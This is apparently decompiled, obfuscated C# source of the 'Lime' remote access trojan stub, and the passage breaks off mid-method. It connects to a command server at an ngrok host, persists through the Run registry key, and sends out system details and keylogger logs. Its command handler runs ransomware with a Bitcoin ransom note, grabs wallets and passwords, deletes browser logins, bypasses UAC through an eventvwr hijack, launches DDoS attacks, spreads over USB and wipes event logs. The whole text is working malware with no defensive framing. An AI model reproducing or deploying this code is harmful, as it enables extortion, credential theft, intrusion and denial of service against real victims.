using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Lime;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

[StandardModule]
internal sealed class Class6
{
	public static string string_0;

	public static bool bool_0;

	public static string string_1;

	public static string string_2;

	private static byte[] byte_0;

	public static bool bool_1;

	public static TcpClient tcpClient_0;

	public static bool bool_2;

	public static string string_3;

	public static string string_4;

	public static Computer computer_0;

	public static FileStream fileStream_0;

	public static string string_5;

	public static bool bool_3;

	public static bool bool_4;

	public static bool bool_5;

	public static bool bool_6;

	public static bool bool_7;

	public static kl kl_0;

	private static string string_6;

	public static FileInfo fileInfo_0;

	private static MemoryStream memoryStream_0;

	public static Mutex mutex_0;

	public static string string_7;

	public static object object_0;

	public static string string_8;

	public static string string_9;

	public static string string_10;

	public static string string_11;

	public static string string_12;

	public static bool bool_8;

	public static bool bool_9;

	public static bool bool_10;

	static Class6()
	{
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		Class13.F2pn6WrzFkP6h();
		string_0 = "";
		bool_0 = Conversions.ToBoolean("False");
		string_1 = "0";
		string_2 = "1";
		byte_0 = new byte[5121];
		bool_1 = Conversions.ToBoolean("True");
		tcpClient_0 = null;
		bool_2 = false;
		string_3 = "TEMP";
		string_4 = "Client.exe";
		computer_0 = new Computer();
		string_5 = "0.tcp.ngrok.io";
		bool_3 = Conversions.ToBoolean("True");
		bool_4 = Conversions.ToBoolean("True");
		bool_5 = Conversions.ToBoolean("True");
		bool_6 = Conversions.ToBoolean("False");
		bool_7 = Conversions.ToBoolean("True");
		kl_0 = null;
		string_6 = "";
		fileInfo_0 = new FileInfo(Assembly.GetEntryAssembly()!.Location);
		memoryStream_0 = new MemoryStream();
		mutex_0 = null;
		string_7 = "15046";
		object_0 = null;
		string_8 = "Client.exe";
		string_9 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		string_10 = "TGltZTE=";
		string_11 = "0.7.3";
		string_12 = "123";
		bool_8 = Conversions.ToBoolean("True");
		bool_9 = Conversions.ToBoolean("True");
		bool_10 = Conversions.ToBoolean("True");
	}

	public Class6()
	{
		Class13.F2pn6WrzFkP6h();
		base._002Ector();
	}

	[CompilerGenerated]
	[DebuggerStepThrough]
	private static void smethod_0(byte[] byte_1)
	{
		smethod_17(byte_1);
	}

	[DebuggerStepThrough]
	[CompilerGenerated]
	private static void smethod_1(object sender, SessionEndingEventArgs e)
	{
		smethod_7();
	}

	public static string smethod_2(ref byte[] byte_1)
	{
		return Encoding.UTF8.GetString(byte_1);
	}

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short short_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_13, int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_14, int int_1);

	private static bool smethod_3(FileInfo fileInfo_1, FileInfo fileInfo_2)
	{
		if (Operators.CompareString(fileInfo_1.get_Name().ToLower(), fileInfo_2.get_Name().ToLower(), false) == 0)
		{
			DirectoryInfo directoryInfo = fileInfo_1.Directory;
			DirectoryInfo directoryInfo2 = fileInfo_2.Directory;
			do
			{
				if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
				{
					directoryInfo = directoryInfo.Parent;
					directoryInfo2 = directoryInfo2.Parent;
					if (!(directoryInfo == null && directoryInfo2 == null))
					{
						if (directoryInfo == null)
						{
							return false;
						}
						continue;
					}
					return true;
				}
				return false;
			}
			while (directoryInfo2 != null);
		}
		return false;
	}

	public static bool smethod_4()
	{
		bool_2 = false;
		Thread.Sleep(2000);
		FileInfo fileInfo = fileInfo_0;
		lock (fileInfo)
		{
			try
			{
				if (tcpClient_0 != null)
				{
					try
					{
						tcpClient_0.Close();
						tcpClient_0 = null;
						Thread.Sleep(checked((int)Math.Round(Math.Round(Math.Round(Conversions.ToDouble(string_2) * 1000.0)))));
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception projectError = ex;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					memoryStream_0.Dispose();
				}
				catch (Exception ex2)
				{
					ProjectData.SetProjectError(ex2);
					Exception projectError2 = ex2;
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception projectError3 = ex3;
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				memoryStream_0 = new MemoryStream();
				tcpClient_0 = new TcpClient();
				tcpClient_0.ReceiveBufferSize = 204800;
				tcpClient_0.SendBufferSize = 204800;
				tcpClient_0.Client.SendTimeout = 10000;
				tcpClient_0.Client.ReceiveTimeout = 10000;
				tcpClient_0.Connect(string_5, Conversions.ToInteger(string_7));
				bool_2 = true;
				smethod_26(smethod_18());
				try
				{
					string text = default(string);
					if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(smethod_13("vn", "")), (object)"", false))
					{
						text = text + smethod_5(ref string_10) + "\r\n";
					}
					else
					{
						string text2 = text;
						string string_ = Conversions.ToString(RuntimeHelpers.GetObjectValue(smethod_13("vn", "")));
						text = text2 + smethod_5(ref string_) + "\r\n";
					}
					text = text + string_5 + ":" + string_7 + "\r\n" + string_3 + "\r\n" + string_4 + "\r\n" + Conversions.ToString(bool_3) + "\r\n" + Conversions.ToString(bool_5) + "\r\n" + Conversions.ToString(bool_7) + "\r\n" + Conversions.ToString(bool_1);
					smethod_26("inf" + string_12 + smethod_8(ref text));
				}
				catch (Exception ex4)
				{
					ProjectData.SetProjectError(ex4);
					Exception projectError4 = ex4;
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception projectError5 = ex5;
				ProjectData.SetProjectError(projectError5);
				bool_2 = false;
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		return bool_2;
	}

	public static string smethod_5(ref string string_13)
	{
		byte[] byte_ = Convert.FromBase64String(string_13);
		return smethod_2(ref byte_);
	}

	public static void smethod_6(string string_13)
	{
		try
		{
			((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + string_8, writable: true)!.DeleteValue(string_13);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_7()
	{
		smethod_23(0);
	}

	public static string smethod_8(ref string string_13)
	{
		return Convert.ToBase64String(smethod_25(ref string_13));
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_13, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_14, int int_0, ref int int_1, ref int int_2, ref int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_15, int int_4);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_13, int int_0);

	public static bool smethod_9()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					string string_ = null;
					short short_ = (short)num;
					string string_2 = Strings.Space(100);
					if (!capGetDriverDescriptionA(short_, ref string_2, 100, ref string_, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	public static string smethod_10()
	{
		string result;
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			if (foregroundWindow == IntPtr.Zero)
			{
				return "";
			}
			string string_ = Strings.Space(checked(GetWindowTextLengthA((long)foregroundWindow) + 1));
			GetWindowTextA(foregroundWindow, ref string_, string_.Length);
			result = smethod_8(ref string_);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			result = "";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string smethod_11()
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		checked
		{
			string text;
			do
			{
				string processName = processes[num].ProcessName;
				text = ((Operators.CompareString(processName, "bitcoin-qt", false) == 0) ? "BitcoinCore" : ((Operators.CompareString(processName, "Bitcoin.com.exe", false) == 0) ? "Bitcoin.com Wallet" : ((!processName.Contains("electrum")) ? "Not Found" : "Electrum")));
				_ = processes[num].Id;
				num++;
			}
			while (!((Operators.CompareString(text, "Not Found", false) != 0) | (num > processes.Length - 1)));
			if (num > processes.Length - 1)
			{
				text = "Not Found";
			}
			return text;
		}
	}

	public static string smethod_12()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		try
		{
			string text = null;
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val3).get_Item("displayName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (Operators.CompareString(text, string.Empty, false) == 0)
			{
				text = "N/A";
			}
			return text.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "AntiVirus: N/A";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long long_0);

	public static object smethod_13(string string_13, object object_1)
	{
		object objectValue;
		try
		{
			objectValue = RuntimeHelpers.GetObjectValue(((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + string_8)!.GetValue(string_13, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_1))));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			objectValue = RuntimeHelpers.GetObjectValue(object_1);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return objectValue;
	}

	public static string smethod_14()
	{
		string result;
		try
		{
			string string_ = null;
			int int_ = 0;
			int int_2 = 0;
			string string_2 = null;
			string string_3 = Interaction.Environ("SystemDrive") + "\\";
			int int_3 = default(int);
			GetVolumeInformationA(ref string_3, ref string_, 0, ref int_3, ref int_, ref int_2, ref string_2, 0);
			result = Conversion.Hex(int_3);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			result = "ERR";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string smethod_15()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		try
		{
			ManagementObject val = new ManagementObject("Win32_Processor.deviceid=\"CPU0\"");
			val.Get();
			return ((ManagementBaseObject)val).get_Item("Name").ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "N/A";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_16()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ObjectQuery val = new ObjectQuery("SELECT * FROM Win32_VideoController");
			ManagementObjectSearcher val2 = new ManagementObjectSearcher(val);
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)text, ((ManagementBaseObject)val3).get_Item("Name")), (object)". "));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "N/A";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long SwapMouseButton(long long_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern void SendMessage(int int_0, uint uint_0, uint uint_1, int int_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowPos(int int_0, int int_1, int int_2, int int_3, int int_4, int int_5, int int_6);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_13, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_14);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr intptr_0, int int_0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int int_0, int int_1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_13, int int_2);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_17(byte[] byte_1)
	{
		//IL_078c: Unknown result type (might be due to invalid IL or missing references)
		//IL_089e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cf5: Expected O, but got Unknown
		//IL_1b5f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b66: Expected O, but got Unknown
		//IL_1bf1: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bf8: Expected O, but got Unknown
		string[] array = Strings.Split(smethod_2(ref byte_1), string_12, -1, (CompareMethod)0);
		checked
		{
			try
			{
				string text = array[0];
				byte[] bytes = default(byte[]);
				switch (text)
				{
				case "RwareBG":
				{
					if (array[2][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream = new MemoryStream();
							int length = (array[0] + string_12 + array[1] + string_12).Length;
							memoryStream.Write(byte_1, length, byte_1.Length - length);
							bytes = smethod_30(memoryStream.ToArray());
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception projectError = ex;
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							return;
						}
					}
					string string_ = Path.GetTempFileName() + "." + array[1];
					while (!File.Exists(Path.GetTempPath() + "done.LE"))
					{
						Application.DoEvents();
					}
					try
					{
						File.WriteAllBytes(string_, bytes);
						RegistryKey registryKey = ((ServerComputer)Class3.Class2_0).get_Registry().get_CurrentUser().OpenSubKey("Control Panel\\Desktop", writable: true);
						registryKey.SetValue("WallpaperStyle", "2");
						registryKey.SetValue("TileWallpaper", "0");
						SystemParametersInfoA(20, 0, ref string_, 1);
						return;
					}
					catch (Exception ex2)
					{
						ProjectData.SetProjectError(ex2);
						Exception projectError2 = ex2;
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
				}
				case "delchrm":
				{
					string text5 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome";
					if (Directory.Exists(text5))
					{
						object current6 = WindowsIdentity.GetCurrent();
						object obj6 = new WindowsPrincipal((WindowsIdentity)current6);
						if (!Conversions.ToBoolean(NewLateBinding.LateGet(obj6, (Type)null, "IsInRole", new object[1] { WindowsBuiltInRole.Administrator }, (string[])null, (Type[])null, (bool[])null)))
						{
							smethod_26("MSG" + string_12 + "Delete Cookies: Lime's Stub is not running as administrator");
							break;
						}
						try
						{
							Process[] processesByName2 = Process.GetProcessesByName("chrome");
							Process[] array11 = processesByName2;
							foreach (Process process2 in array11)
							{
								process2.Kill();
							}
						}
						catch (Exception projectError8)
						{
							ProjectData.SetProjectError(projectError8);
							ProjectData.ClearProjectError();
						}
						Thread.Sleep(200);
						File.Delete(text5 + "\\User Data\\Default\\Login Data");
						File.Delete(text5 + "\\User Data\\Default\\Cookies");
						smethod_26("MSG" + string_12 + "Chrome cookies and login deleted successfully!");
					}
					else
					{
						smethod_26("MSG" + string_12 + "Chrome is not installed!");
					}
					break;
				}
				case "OpenWebpageHidden":
					try
					{
						HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(array[1]);
						_ = (HttpWebResponse)httpWebRequest.GetResponse();
						httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
						httpWebRequest.AllowAutoRedirect = true;
						httpWebRequest.Timeout = 10000;
						httpWebRequest.Method = "GET";
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "MonitorOFF":
					SendMessage(-1, 274u, 61808u, 2);
					break;
				case "TextToSpeech":
				{
					object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice", "")));
					object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
					Type type = null;
					string text4 = "speak";
					object[] array2 = new object[1];
					object[] array3 = array2;
					string[] array4 = array;
					string[] array5 = array4;
					int num = 1;
					array3[0] = array5[1];
					object[] array6 = array2;
					object[] array7 = array6;
					string[] array8 = null;
					Type[] array9 = null;
					bool[] array10 = new bool[1] { true };
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue2), type, text4, array7, array8, array9, array10, true);
					if (array10[0])
					{
						array4[num] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array6[0])), typeof(string)));
					}
					break;
				}
				case "RwareDEC":
				{
					string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					if (!File.Exists(folderPath3 + "\\Microsoft\\MMC\\hash"))
					{
						smethod_26("MSG" + string_12 + "Ransomware: The client is not encrypted");
						return;
					}
					RwareDE rwareDE = new RwareDE();
					rwareDE.Decrypt_File();
					string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
					Process[] processesByName3 = Process.GetProcessesByName("notepad");
					foreach (Process process3 in processesByName3)
					{
						process3.Kill();
					}
					File.Delete(folderPath3 + "\\Microsoft\\MMC\\hash");
					File.Delete(folderPath4 + "\\Ransomware.txt");
					File.Delete(Path.GetTempPath() + "done.LE");
					break;
				}
				case "NormalMouse":
					SwapMouseButton(0L);
					break;
				case "taskmgrON":
				{
					object current5 = WindowsIdentity.GetCurrent();
					object obj5 = new WindowsPrincipal((WindowsIdentity)current5);
					if (!Conversions.ToBoolean(NewLateBinding.LateGet(obj5, (Type)null, "IsInRole", new object[1] { WindowsBuiltInRole.Administrator }, (string[])null, (Type[])null, (bool[])null)))
					{
						smethod_26("MSG" + string_12 + "TaskManagerEnable: Lime's Stub is not running as administrator");
					}
					else
					{
						((ServerComputer)Class3.Class2_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"0", RegistryValueKind.DWord);
					}
					break;
				}
				case "ChngWLL":
				{
					if (array[2][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream2 = new MemoryStream();
							int length2 = (array[0] + string_12 + array[1] + string_12).Length;
							memoryStream2.Write(byte_1, length2, byte_1.Length - length2);
							bytes = smethod_30(memoryStream2.ToArray());
						}
						catch (Exception ex3)
						{
							ProjectData.SetProjectError(ex3);
							Exception projectError3 = ex3;
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							return;
						}
					}
					string string_4 = Path.GetTempFileName() + "." + array[1];
					try
					{
						File.WriteAllBytes(string_4, bytes);
						RegistryKey registryKey3 = ((ServerComputer)Class3.Class2_0).get_Registry().get_CurrentUser().OpenSubKey("Control Panel\\Desktop", writable: true);
						registryKey3.SetValue("WallpaperStyle", "2");
						registryKey3.SetValue("TileWallpaper", "0");
						SystemParametersInfoA(20, 0, ref string_4, 1);
						return;
					}
					catch (Exception ex4)
					{
						ProjectData.SetProjectError(ex4);
						Exception projectError4 = ex4;
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
				}
				case "kl":
					smethod_26("kl" + string_12 + smethod_8(ref kl_0.Logs));
					return;
				case "msgbox":
					MessageBox.Show(array[1], "", (MessageBoxButtons)0, (MessageBoxIcon)0, (MessageBoxDefaultButton)0, (MessageBoxOptions)2097152, false);
					break;
				case "seed":
					Class7.smethod_0(array[1]);
					break;
				case "ddos.slowloris.start":
					Slowloris.StartSlowloris(array[1], 10, 21600, "");
					break;
				case "ll":
					bool_2 = false;
					return;
				case "SL":
				{
					try
					{
						File.Delete(Path.GetTempPath() + "\\SL.dat");
						File.Create(Path.GetTempPath() + "\\STSL.dat");
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					YYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev yYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev = new YYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev();
					((Form)yYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev).ShowDialog();
					break;
				}
				case "SLU":
					try
					{
						File.Create(Path.GetTempPath() + "\\SL.dat");
						Thread.Sleep(10);
						File.Delete(Path.GetTempPath() + "\\STSL.dat");
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					smethod_26("MSG" + string_12 + "Screen Locker: UNLOCKED!");
					break;
				case "RwareSU":
					while (!File.Exists(Path.GetTempPath() + "done.LE"))
					{
						Application.DoEvents();
					}
					Environment.GetFolderPath(Environment.SpecialFolder.Startup);
					if (bool_0)
					{
						Process[] processesByName = Process.GetProcessesByName("notepad");
						foreach (Process process in processesByName)
						{
							process.Kill();
						}
						string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
						string text2 = folderPath2 + "\\Ransomware.txt";
						if (File.Exists(text2))
						{
							File.Delete(text2);
						}
						using (StreamWriter streamWriter = new StreamWriter(text2, append: true))
						{
							streamWriter.WriteLine("All your files have been locked");
							streamWriter.WriteLine("");
							streamWriter.WriteLine("You can get them back, Just pay us " + array[1] + " as Bitcoin");
							streamWriter.WriteLine("");
							streamWriter.WriteLine("Our bitcoin address is");
							streamWriter.WriteLine("");
							streamWriter.WriteLine(string_0);
							streamWriter.WriteLine("");
							streamWriter.WriteLine("Watch this video to learn how to pay us https://www.youtube.com/watch?v=Ji9IwPId5Uk");
							streamWriter.WriteLine("");
							streamWriter.WriteLine("This is not a joke. This is a ransomware");
						}
						Process.Start(text2);
					}
					else
					{
						smethod_26("MSG" + string_12 + "Ransomware: Couldn't send address. The stub has no BTC address");
					}
					break;
				case "restartme":
					Interaction.Shell("shutdown -r -t 00 -f", (AppWinStyle)0, false, -1);
					break;
				case "GiveMeAdmin":
				{
					smethod_23(0);
					using (RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Classes\\mscfile\\shell\\open\\command"))
					{
						registryKey2.SetValue("", Application.get_ExecutablePath(), RegistryValueKind.String);
					}
					Process.Start("eventvwr.exe");
					ProjectData.EndApp();
					break;
				}
				case "DisableCMD":
				{
					object current3 = WindowsIdentity.GetCurrent();
					object obj3 = new WindowsPrincipal((WindowsIdentity)current3);
					if (!Conversions.ToBoolean(NewLateBinding.LateGet(obj3, (Type)null, "IsInRole", new object[1] { WindowsBuiltInRole.Administrator }, (string[])null, (Type[])null, (bool[])null)))
					{
						smethod_26("MSG" + string_12 + "DisableCMD: Lime's Stub is not running as administrator");
					}
					else
					{
						((ServerComputer)Class3.Class2_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"1", RegistryValueKind.DWord);
					}
					break;
				}
				case "taskmgrOFF":
				{
					object current = WindowsIdentity.GetCurrent();
					object obj = new WindowsPrincipal((WindowsIdentity)current);
					if (!Conversions.ToBoolean(NewLateBinding.LateGet(obj, (Type)null, "IsInRole", new object[1] { WindowsBuiltInRole.Administrator }, (string[])null, (Type[])null, (bool[])null)))
					{
						smethod_26("MSG" + string_12 + "TaskManagerDisbale: Lime's Stub is not running as administrator");
					}
					else
					{
						((ServerComputer)Class3.Class2_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
					}
					break;
				}
				case "EventLogs":
				{
					object current7 = WindowsIdentity.GetCurrent();
					object obj7 = new WindowsPrincipal((WindowsIdentity)current7);
					if (!Conversions.ToBoolean(NewLateBinding.LateGet(obj7, (Type)null, "IsInRole", new object[1] { WindowsBuiltInRole.Administrator }, (string[])null, (Type[])null, (bool[])null)))
					{
						smethod_26("MSG" + string_12 + "EventLogs: Lime's Stub is not running as administrator");
						break;
					}
					EventLog val = new EventLog();
					EventLog[] eventLogs = EventLog.GetEventLogs();
					for (int k = 0; k < eventLogs.Length; k++)
					{
						val = eventLogs[k];
						val.Clear();
						val.Close();
					}
					smethod_26("MSG" + string_12 + "Events Logs deleted successfully!");
					break;
				}
				case "HideBar":
				{
					string string_6 = "Shell_traywnd";
					string string_7 = "";
					int int_2 = FindWindowA(ref string_6, ref string_7);
					SetWindowPos(int_2, 0, 0, 0, 0, 0, 128);
					break;
				}
				case "BitcoinOFF":
					if (!bool_0)
					{
						smethod_26("MSG" + string_12 + "BitcoinGrabber was not checked when stub created!");
						return;
					}
					try
					{
						bitgrb.stopme();
						Interaction.SaveSetting("Lime", "SU", "btc", "0");
						smethod_26("MSG" + string_12 + "BitcoinGrabber stopped successfully!");
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						smethod_26("MSG" + string_12 + "BitcoinGrabber is already not running");
						ProjectData.ClearProjectError();
					}
					break;
				case "pass2":
				{
					if (array[2][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream3 = new MemoryStream();
							int length3 = (array[0] + string_12 + array[1] + string_12).Length;
							memoryStream3.Write(byte_1, length3, byte_1.Length - length3);
							bytes = smethod_30(memoryStream3.ToArray());
						}
						catch (Exception ex5)
						{
							ProjectData.SetProjectError(ex5);
							Exception projectError5 = ex5;
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							return;
						}
					}
					string text3 = Path.GetTempFileName() + "." + array[1];
					try
					{
						File.WriteAllBytes(text3, bytes);
						Process.Start(text3);
						Thread.Sleep(5000);
						string path = Path.GetTempPath() + "\\dump456\\pwd.txt";
						string string_5 = File.ReadAllText(path);
						smethod_26("pass2" + string_12 + smethod_8(ref string_5));
					}
					catch (Exception ex6)
					{
						ProjectData.SetProjectError(ex6);
						Exception projectError6 = ex6;
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
					break;
				}
				case "ClearClp":
				{
					Thread thread2 = new Thread((ThreadStart)Clipboard.Clear);
					thread2.SetApartmentState(ApartmentState.STA);
					thread2.Start();
					smethod_26("MSG" + string_12 + "Clipboard cleared successfully!");
					break;
				}
				case "antiprocstop":
					MyAntiProcess.stopme();
					MyAntiProcess.XAnti();
					((ServerComputer)Class3.Class2_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Lime", "anti", (object)"0");
					smethod_26("MSG" + string_12 + "Anti Process Stopped!");
					break;
				case "shutdownme":
					Interaction.Shell("shutdown -s -t 00 -f", (AppWinStyle)0, false, -1);
					break;
				case "MonitorON":
					SendMessage(-1, 274u, 61808u, -1);
					break;
				case "ReverseMouse":
					SwapMouseButton(256L);
					break;
				case "spreadusbme":
					SPUSB.Enable();
					break;
				case "ddos.ARME.stop":
					ARME.StopARME();
					break;
				case "ddos.slowloris.stop":
					Slowloris.StopSlowloris();
					break;
				case "EnableCMD":
				{
					object current4 = WindowsIdentity.GetCurrent();
